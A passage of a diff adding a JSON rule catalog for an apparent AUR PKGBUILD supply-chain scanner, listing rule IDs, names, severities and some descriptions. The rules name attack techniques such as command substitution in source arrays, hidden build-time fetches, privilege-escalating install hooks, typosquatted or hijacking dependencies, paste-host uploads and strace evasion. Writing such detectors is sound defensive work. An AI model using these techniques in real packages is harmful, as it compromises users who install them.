@@ -1,0 +1,2026 @@
+{
+  "a001": {
+    "id": "A001",
+    "name": "Setuid File In Artifact",
+    "severity": "HIGH",
+    "categoryTitle": "Artifact",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/artifact/#a001"
+  },
+  "a002": {
+    "id": "A002",
+    "name": "Undeclared Unit In Artifact",
+    "severity": "MEDIUM",
+    "categoryTitle": "Artifact",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/artifact/#a002"
+  },
+  "a003": {
+    "id": "A003",
+    "name": "Library Outside Depends",
+    "severity": "MEDIUM",
+    "categoryTitle": "Artifact",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/artifact/#a003"
+  },
+  "a004": {
+    "id": "A004",
+    "name": "Install Hook Diverges From Declaration",
+    "severity": "HIGH",
+    "categoryTitle": "Artifact",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/artifact/#a004"
+  },
+  "a005": {
+    "id": "A005",
+    "name": "Unusual Artifact Mode",
+    "severity": "INFO",
+    "categoryTitle": "Artifact",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/artifact/#a005"
+  },
+  "a006": {
+    "id": "A006",
+    "name": "File Capabilities In Artifact",
+    "severity": "HIGH",
+    "categoryTitle": "Artifact",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/artifact/#a006"
+  },
+  "a007": {
+    "id": "A007",
+    "name": "Privileged Surface In Artifact",
+    "severity": "MEDIUM",
+    "categoryTitle": "Artifact",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/artifact/#a007"
+  },
+  "a008": {
+    "id": "A008",
+    "name": "eBPF Artifact In Package",
+    "severity": "HIGH",
+    "categoryTitle": "Artifact",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/artifact/#a008"
+  },
+  "c001": {
+    "id": "C001",
+    "name": "Checksum Changed Without Source Change With Stable Version",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "A checksum changed with no corresponding version or source change is anomalous. It suggests the tarball content changed without an upstream version bump, which is a red flag for supply-chain compromise. A version move alone no longer stands the signal down when the bump is used as cover: a routine bump that also starts downloading or running something keeps the HIGH finding. Gated by `[thresholds] c001.require_capability_signal` (default true); set it false to restore the historical \"every bump is C002\" rule.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c001"
+  },
+  "c002": {
+    "id": "C002",
+    "name": "Checksum Updated With Version Bump",
+    "severity": "INFO",
+    "categoryTitle": "Integrity and Verification",
+    "description": "Normal during routine version bumps. Recorded for audit trail; contributes no weight.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c002"
+  },
+  "c003": {
+    "id": "C003",
+    "name": "Source URL Changed Without Version Bump",
+    "severity": "INFO",
+    "categoryTitle": "Integrity and Verification",
+    "description": "Source URLs swapped without a version bump is noteworthy but not necessarily malicious. Recorded for audit trail; contributes no weight.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c003"
+  },
+  "c004": {
+    "id": "C004",
+    "name": "Checksum Removed For Unchanged Source",
+    "severity": "CRITICAL",
+    "categoryTitle": "Integrity and Verification",
+    "description": "Distinct from H002 (`sha256sums=()` added, array emptied in place): here the declaration disappears from the file entirely, leaving makepkg with nothing to verify against a source that itself did not change. Detected by `detect_checksum_removed()` in `src/trustsight/differ.py`.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c004"
+  },
+  "c005": {
+    "id": "C005",
+    "name": "Binary Artifact From Untrusted Source",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "A prebuilt binary cannot be reviewed from the PKGBUILD, so its provenance is the only available evidence. Restricted to untrusted buckets deliberately: `-bin` packages repackaging a GitHub release are a large fraction of the AUR and firing on all of them would make the rule pure noise.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c005"
+  },
+  "c006": {
+    "id": "C006",
+    "name": "Maintainer Change With New Source Domain",
+    "severity": "HIGH",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "Either signal alone is routine; maintainers change hands, domains migrate. Together they are the shape of an account takeover redirecting sources to attacker-controlled infrastructure. Requires maintainer metadata, so it fires only in the live path, not in offline corpus replay.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#c006"
+  },
+  "c007": {
+    "id": "C007",
+    "name": "Command Substitution In Source Array",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "The source array is data, evaluated when the PKGBUILD is parsed. A command substitution there executes *before* any build function runs, and before any rule that inspects `build()` has anything to look at.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#c007"
+  },
+  "c008": {
+    "id": "C008",
+    "name": "Unread Content Moved Under A Stable Version",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c008"
+  },
+  "c009": {
+    "id": "C009",
+    "name": "Unread Content Moved With The Version",
+    "severity": "INFO",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c009"
+  },
+  "c010": {
+    "id": "C010",
+    "name": "Binary Metadata File",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c010"
+  },
+  "c011": {
+    "id": "C011",
+    "name": "Prebuilt Binary From Non-Upstream Host",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c011"
+  },
+  "c012": {
+    "id": "C012",
+    "name": "Source Domain Resembles Declared Upstream",
+    "severity": "MEDIUM",
+    "categoryTitle": "Deception and Anti-Analysis",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/deception/#c012"
+  },
+  "c013": {
+    "id": "C013",
+    "name": "Source Fork Diverges From Declared Upstream",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c013"
+  },
+  "c014": {
+    "id": "C014",
+    "name": "Array Order Manipulation",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c014"
+  },
+  "c015": {
+    "id": "C015",
+    "name": "Fetch In package()",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#c015"
+  },
+  "c016": {
+    "id": "C016",
+    "name": "Interpreter Invocation In Install Hook",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#c016"
+  },
+  "c017": {
+    "id": "C017",
+    "name": "Install Hook Writes To A User-Writable Location",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#c017"
+  },
+  "c018": {
+    "id": "C018",
+    "name": "Executable File Committed",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c018"
+  },
+  "c019": {
+    "id": "C019",
+    "name": "File Renamed",
+    "severity": "INFO",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c019"
+  },
+  "c020": {
+    "id": "C020",
+    "name": "Credentials In A Source URL",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c020"
+  },
+  "c021": {
+    "id": "C021",
+    "name": "Dependency Removal During A Build Change",
+    "severity": "HIGH",
+    "categoryTitle": "Composition",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/composition/#c021"
+  },
+  "c022": {
+    "id": "C022",
+    "name": "Checksum Strength Downgraded",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c022"
+  },
+  "c023": {
+    "id": "C023",
+    "name": "IP-Literal Source Host",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c023"
+  },
+  "c024": {
+    "id": "C024",
+    "name": "Install Script Not Declared",
+    "severity": "MEDIUM",
+    "categoryTitle": "Composition",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/composition/#c024"
+  },
+  "c025": {
+    "id": "C025",
+    "name": "Hardening Option Disabled",
+    "severity": "LOW",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#c025"
+  },
+  "c026": {
+    "id": "C026",
+    "name": "Empty File Added",
+    "severity": "INFO",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c026"
+  },
+  "c027": {
+    "id": "C027",
+    "name": "Declared Install Script Is Absent",
+    "severity": "INFO",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c027"
+  },
+  "c028": {
+    "id": "C028",
+    "name": "Build Cache Outside The Build Trees",
+    "severity": "",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#c028"
+  },
+  "c029": {
+    "id": "C029",
+    "name": "Backup Array Gains Entries",
+    "severity": "INFO",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#c029"
+  },
+  "c030": {
+    "id": "C030",
+    "name": "Epoch Removed With Version Unchanged",
+    "severity": "INFO",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#c030"
+  },
+  "c031": {
+    "id": "C031",
+    "name": "Boot Or System Image Tool Run During Build",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#c031"
+  },
+  "d001": {
+    "id": "D001",
+    "name": "Novel Dependency Added",
+    "severity": "HIGH",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "A dependency name appears that has never been observed anywhere in the AUR. Either a typo or a package created specifically to be pulled in.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#d001"
+  },
+  "d002": {
+    "id": "D002",
+    "name": "Typosquatted Dependency",
+    "severity": "HIGH",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "A novel dependency name within one or two edits (Damerau-Levenshtein, so transpositions count) of a popular package: `openss1` for `openssl`, `cur1` for `curl`.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#d002"
+  },
+  "d003": {
+    "id": "D003",
+    "name": "New Network-Using Makedepends",
+    "severity": "MEDIUM",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "`makedepends` gains a network-capable tool (`curl`, `wget`, `git`, `python-requests`, …) that was not there before, meaning the build can now fetch code that no checksum covers.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#d003"
+  },
+  "d004": {
+    "id": "D004",
+    "name": "Dependency Hijack Via Provides",
+    "severity": "HIGH",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "`provides=` or `replaces=` declares an **established package unrelated to this one**. `provides=('openssl')` or `replaces=('sudo')` installs this package in front of the real one, satisfying every dependency on it.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#d004"
+  },
+  "e001": {
+    "id": "E001",
+    "name": "Added-Text Compression Ratio",
+    "severity": "MEDIUM",
+    "categoryTitle": "Entropy",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/entropy/#e001"
+  },
+  "e002": {
+    "id": "E002",
+    "name": "Encoded-Alphabet Fraction",
+    "severity": "MEDIUM",
+    "categoryTitle": "Entropy",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/entropy/#e002"
+  },
+  "e003": {
+    "id": "E003",
+    "name": "Identifier Entropy",
+    "severity": "MEDIUM",
+    "categoryTitle": "Entropy",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/entropy/#e003"
+  },
+  "g001": {
+    "id": "G001",
+    "name": "Shared Gained Host",
+    "severity": "HIGH",
+    "categoryTitle": "Correlation",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/correlation/#g001"
+  },
+  "g002": {
+    "id": "G002",
+    "name": "Shared Added Literal",
+    "severity": "HIGH",
+    "categoryTitle": "Correlation",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/correlation/#g002"
+  },
+  "g003": {
+    "id": "G003",
+    "name": "Coordinated Adoption",
+    "severity": "MEDIUM",
+    "categoryTitle": "Correlation",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/correlation/#g003"
+  },
+  "g004": {
+    "id": "G004",
+    "name": "Shared Upstream Dependency",
+    "severity": "HIGH",
+    "categoryTitle": "Correlation",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/correlation/#g004"
+  },
+  "g005": {
+    "id": "G005",
+    "name": "Impersonation Campaign",
+    "severity": "HIGH",
+    "categoryTitle": "Correlation",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/correlation/#g005"
+  },
+  "h001": {
+    "id": "H001",
+    "name": "Checksum Disabled",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h001"
+  },
+  "h002": {
+    "id": "H002",
+    "name": "Checksum Emptied",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h002"
+  },
+  "h003": {
+    "id": "H003",
+    "name": "Insecure Download Protocol",
+    "severity": "LOW",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Plain HTTP permits a network attacker to replace a download in transit. Adding a checksum in the same diff supplies checksum backing and suppresses this rule; `sha256sums=('SKIP')` does not. The rule is intentionally about transport without newly declared integrity backing, not about pipes or archive suffixes.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h003"
+  },
+  "h004": {
+    "id": "H004",
+    "name": "Privilege Escalation",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Detects a privilege tool that is *executed* rather than mentioned. Command position is what separates the two: `groups=('sudo')`, an `optdepends` name, and `echo \"sudo required\"` place the word at an argument position and stay quiet, while `echo \"x\"; sudo ...` is an execution context and fires. Naming `doas`, `pkexec` and `run0` as well as `sudo` tests what the recipe does rather than which tool its author preferred.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h004"
+  },
+  "h005": {
+    "id": "H005",
+    "name": "validpgpkeys Added",
+    "severity": "",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h005"
+  },
+  "h006": {
+    "id": "H006",
+    "name": "New Make/Opt/Check Dependency",
+    "severity": "",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#h006"
+  },
+  "h007": {
+    "id": "H007",
+    "name": "Symlink Redirect",
+    "severity": "",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#h007"
+  },
+  "h008": {
+    "id": "H008",
+    "name": "Suspicious Environment Variable",
+    "severity": "",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h008"
+  },
+  "h009": {
+    "id": "H009",
+    "name": "Network connection attempt",
+    "severity": "",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h009"
+  },
+  "h010": {
+    "id": "H010",
+    "name": "Suspicious file write",
+    "severity": "",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#h010"
+  },
+  "h011": {
+    "id": "H011",
+    "name": "Sensitive binary execution",
+    "severity": "",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h011"
+  },
+  "h012": {
+    "id": "H012",
+    "name": "Strace detection attempt (TracerPid check)",
+    "severity": "",
+    "categoryTitle": "Deception and Anti-Analysis",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/deception/#h012"
+  },
+  "h013": {
+    "id": "H013",
+    "name": "Strace log truncated (possible flood evasion)",
+    "severity": "",
+    "categoryTitle": "Deception and Anti-Analysis",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/deception/#h013"
+  },
+  "h014": {
+    "id": "H014",
+    "name": "Eval or Exec Usage",
+    "severity": "",
+    "categoryTitle": "Obfuscation",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/obfuscation/#h014"
+  },
+  "h015": {
+    "id": "H015",
+    "name": "Critical Build Function Modified",
+    "severity": "INFO",
+    "categoryTitle": "Fetch and Execution",
+    "description": "The diff changes any line inside `build()`, `prepare()`, `check()`, or `package()`. Many supply-chain attacks add a single line to one of these functions, so this reports that an executing function was altered.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h015"
+  },
+  "h016": {
+    "id": "H016",
+    "name": "Hidden Network Fetch In Build",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "A command inside `build()`, `prepare()`, `check()`, or `package()` downloads a URL that does not appear in `source=()`. This is the classic route around checksum verification: the declared sources verify cleanly while the real payload arrives at compile time.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h016"
+  },
+  "h017": {
+    "id": "H017",
+    "name": "Install Hook Fetches Or Executes",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "A `.install` hook body (`post_install`, `post_upgrade`, `pre_install`, `pre_upgrade`, `pre_remove`, `post_remove`) downloads something or performs a privileged operation: `chmod u+s`, `systemctl enable`, `eval`, `useradd`.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h017"
+  },
+  "h018": {
+    "id": "H018",
+    "name": "Patch Applied From Outside The Build Tree",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "`patch` or `git apply` inside a build function takes its input from a URL, an absolute path, or process substitution.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h018"
+  },
+  "h019": {
+    "id": "H019",
+    "name": "Source URL Downgraded To HTTP",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "A URL declared in `source=()` as `https://` before the diff appears as `http://` after it, with the same host and path. Plain http was never upgraded; this is a URL that lost its transport security.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h019"
+  },
+  "h020": {
+    "id": "H020",
+    "name": "Very Recent Update",
+    "severity": "INFO",
+    "categoryTitle": "Temporal Context",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#h020"
+  },
+  "h021": {
+    "id": "H021",
+    "name": "Brand New Package",
+    "severity": "INFO",
+    "categoryTitle": "Temporal Context",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#h021"
+  },
+  "h022": {
+    "id": "H022",
+    "name": "Stale Package Revived",
+    "severity": "MEDIUM",
+    "categoryTitle": "Temporal Context",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#h022"
+  },
+  "h023": {
+    "id": "H023",
+    "name": "Install Hook Present",
+    "severity": "INFO",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h023"
+  },
+  "h024": {
+    "id": "H024",
+    "name": "GPG Verification Removed",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h024"
+  },
+  "h025": {
+    "id": "H025",
+    "name": "Build Environment Subversion",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h025"
+  },
+  "h026": {
+    "id": "H026",
+    "name": "Untrusted Maintainer Takeover (corpus path)",
+    "severity": "HIGH",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h026-corpus"
+  },
+  "h027": {
+    "id": "H027",
+    "name": "Capability Density Anomaly",
+    "severity": "INFO",
+    "categoryTitle": "Composition",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/composition/#h027"
+  },
+  "h028": {
+    "id": "H028",
+    "name": "Accelerated Release Cadence",
+    "severity": "",
+    "categoryTitle": "Corpus Behavioral",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/corpus-behavioral/#h028"
+  },
+  "h029": {
+    "id": "H029",
+    "name": "Package-Name Typosquat",
+    "severity": "HIGH",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#h029-rule"
+  },
+  "h030": {
+    "id": "H030",
+    "name": "Dependency-Set Expansion",
+    "severity": "MEDIUM",
+    "categoryTitle": "Count-Based",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/count-based/#h030-rule"
+  },
+  "h031": {
+    "id": "H031",
+    "name": "Version-In-URL Injection",
+    "severity": "MEDIUM",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h031"
+  },
+  "h032": {
+    "id": "H032",
+    "name": "Write To User Home Or RC",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h032"
+  },
+  "h033": {
+    "id": "H033",
+    "name": "Moved Git Ref",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h033"
+  },
+  "h034": {
+    "id": "H034",
+    "name": "Exotic Source Protocol",
+    "severity": "MEDIUM",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h034"
+  },
+  "h035": {
+    "id": "H035",
+    "name": "Foreign Package Manager In Install Hook",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h035"
+  },
+  "h036": {
+    "id": "H036",
+    "name": "Shell Obfuscation Density",
+    "severity": "MEDIUM",
+    "categoryTitle": "Count-Based",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/count-based/#h036"
+  },
+  "h037": {
+    "id": "H037",
+    "name": "Long-Stable Property Changed",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h037"
+  },
+  "h038": {
+    "id": "H038",
+    "name": "World-Writable Staging",
+    "severity": "HIGH",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#h038"
+  },
+  "h039": {
+    "id": "H039",
+    "name": "Systemd ExecStart From Runtime-Writable Path",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h039"
+  },
+  "h040": {
+    "id": "H040",
+    "name": "Host Reconnaissance",
+    "severity": "INFO",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#h040"
+  },
+  "h041": {
+    "id": "H041",
+    "name": "Upload To Paste Or File-Drop Host",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h041"
+  },
+  "h042": {
+    "id": "H042",
+    "name": "Hidden Drop",
+    "severity": "HIGH",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#h042"
+  },
+  "h043": {
+    "id": "H043",
+    "name": "Attack-Chain Composition",
+    "severity": "INFO",
+    "categoryTitle": "Composition",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/composition/#h043"
+  },
+  "h044": {
+    "id": "H044",
+    "name": "Ownership Transition",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h044"
+  },
+  "h045": {
+    "id": "H045",
+    "name": "Mass Adoption",
+    "severity": "HIGH",
+    "categoryTitle": "Count-Based",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/count-based/#h045"
+  },
+  "h046": {
+    "id": "H046",
+    "name": "Orphan/Adoption Dependency",
+    "severity": "MEDIUM",
+    "categoryTitle": "Corpus Behavioral",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/corpus-behavioral/#h046"
+  },
+  "h047": {
+    "id": "H047",
+    "name": "Security-Relevant Build Flag Change",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h047"
+  },
+  "h048": {
+    "id": "H048",
+    "name": "Dependency Vendored Into Source",
+    "severity": "HIGH",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#h048"
+  },
+  "h049": {
+    "id": "H049",
+    "name": "Source Host Changed",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h049"
+  },
+  "h050": {
+    "id": "H050",
+    "name": "Version Scheme Changed",
+    "severity": "INFO",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h050"
+  },
+  "h051": {
+    "id": "H051",
+    "name": "Package Description Changed",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h051"
+  },
+  "h052": {
+    "id": "H052",
+    "name": "Shared Source Repository",
+    "severity": "HIGH",
+    "categoryTitle": "Count-Based",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/count-based/#h052"
+  },
+  "h053": {
+    "id": "H053",
+    "name": "Name/Host Consensus Divergence",
+    "severity": "MEDIUM",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#h053"
+  },
+  "h054": {
+    "id": "H054",
+    "name": "Build System Changed",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h054"
+  },
+  "h055": {
+    "id": "H055",
+    "name": "Attribute Burst",
+    "severity": "MEDIUM",
+    "categoryTitle": "Count-Based",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/count-based/#h055"
+  },
+  "h056": {
+    "id": "H056",
+    "name": "Known Indicator of Compromise",
+    "severity": "TIERED",
+    "categoryTitle": "Indicators",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/indicator/#h056"
+  },
+  "h057": {
+    "id": "H057",
+    "name": "Transitive Exposure",
+    "severity": "INFO",
+    "categoryTitle": "Corpus Behavioral",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/corpus-behavioral/#h057"
+  },
+  "h058": {
+    "id": "H058",
+    "name": "Maintainer Baseline Deviation",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h058"
+  },
+  "h059": {
+    "id": "H059",
+    "name": "Name/Repo Divergence",
+    "severity": "MEDIUM",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#h059"
+  },
+  "h060": {
+    "id": "H060",
+    "name": "Transitive Orphan Risk",
+    "severity": "INFO",
+    "categoryTitle": "Corpus Behavioral",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/corpus-behavioral/#h060"
+  },
+  "h061": {
+    "id": "H061",
+    "name": "Dependency Centrality",
